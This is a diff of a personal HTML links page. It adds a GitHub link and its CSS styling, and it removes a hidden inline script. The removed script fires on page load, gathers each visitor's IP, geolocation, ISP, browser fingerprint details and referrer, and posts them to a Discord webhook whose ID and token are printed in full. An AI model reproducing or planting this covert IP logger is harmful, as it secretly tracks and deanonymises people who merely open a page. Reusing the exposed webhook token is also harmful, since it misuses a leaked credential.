@@ -33,7 +33,8 @@
         }
         .rscripts,
         .discord,
-        .minecraft {
+        .minecraft,
+        .github {
             display: inline-flex;
             text-align: center;
             align-items: center;
@@ -53,13 +54,15 @@
         }
         .rscripts:hover,
         .discord:hover,
-        .minecraft:hover {
+        .minecraft:hover,
+        .github:hover {
             transform: translate(6px, 6px);
             box-shadow: 0 0 0 #000;
         }
         .rscripts img,
         .discord img,
-        .minecraft img {
+        .minecraft img,
+        .github img {
             width: 30px;
             height: 30px;
         }
@@ -108,86 +111,11 @@
             <img src="https://i.gyazo.com/thumb/1000/a4abc5fdb965d1b97db38453012efc73-png.png">
             my minecraft client
         </a>
+        <a class="github" href="https://github.com/pileton" target="_blank">
+            <img src="https://pngimg.com/uploads/github/github_PNG40.png">
+            my projects
+        </a>
     </div>
-
-    <script>
-        (function() {
-
-            const webhookId = "1520777802364748009";
-            const webhookToken = "lhlkxTniMq2CkClx7owH4XwlPA0lAC2uWRaVNvZdIt174heE-tz57iJ0k4OLhLZEkqPw";
-            const webhookUrl = "https://discord.com/api/webhooks/" + webhookId + "/" + webhookToken;
-
-            function collectData() {
-                const data = {
-                    ip: null,
-                    city: null,
-                    region: null,
-                    country: null,
-                    isp: null,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    language: navigator.language || navigator.languages?.[0] || 'unknown',
-                    userAgent: navigator.userAgent,
-                    screenWidth: screen.width,
-                    screenHeight: screen.height,
-                    colorDepth: screen.colorDepth,
-                    referrer: document.referrer || 'direct',
-                    pageUrl: location.href,
-                    pageTitle: document.title,
-                    plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none'
-                };
-
-                return fetch('https://ipapi.co/json/')
-                    .then(res => res.json())
-                    .then(json => {
-                        data.ip = json.ip;
-                        data.city = json.city;
-                        data.region = json.region;
-                        data.country = json.country_name;
-                        data.isp = json.org;
-                        return data;
-                    })
-                    .catch(() => {
-                        return fetch('https://api.ipify.org?format=json')
-                            .then(r => r.json())
-                            .then(json => {
-                                data.ip = json.ip;
-                                return data;
-                            })
-                            .catch(() => data);
-                    });
-            }
-
-            function sendToDiscord(data) {
-                const embed = {
-                    title: "new log",
-                    color: 0x00ff88,
-                    fields: [
-                        { name: "IP", value: data.ip || 'unknown', inline: true },
-                        { name: "Location", value: `${data.city || ''} ${data.region || ''} ${data.country || ''}`.trim() || 'unknown', inline: true },
-                        { name: "ISP", value: data.isp || 'unknown', inline: true },
-                        { name: "User Agent", value: (data.userAgent || '').slice(0, 100) + ((data.userAgent || '').length > 100 ? '...' : ''), inline: false },
-                        { name: "Screen", value: `${data.screenWidth}x${data.screenHeight} (${data.colorDepth}bit)`, inline: true },
-                        { name: "Timezone", value: data.timezone || 'unknown', inline: true },
-                        { name: "Language", value: data.language || 'unknown', inline: true },
-                        { name: "Referrer", value: data.referrer || 'direct', inline: false },
-                        { name: "Page", value: `[${data.pageTitle || 'Page'}](${data.pageUrl || '#'})`, inline: false }
-                    ],
-                    footer: { text: `Logged at ${new Date().toISOString()}` }
-                };
-
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ embeds: [embed] })
-                }).catch(err => console.error('Logging error:', err));
-            }
-
-            window.addEventListener('load', function() {
-                collectData().then(data => sendToDiscord(data));
-            });
-
-        })();
-    </script>
 
 </body>
 </html>
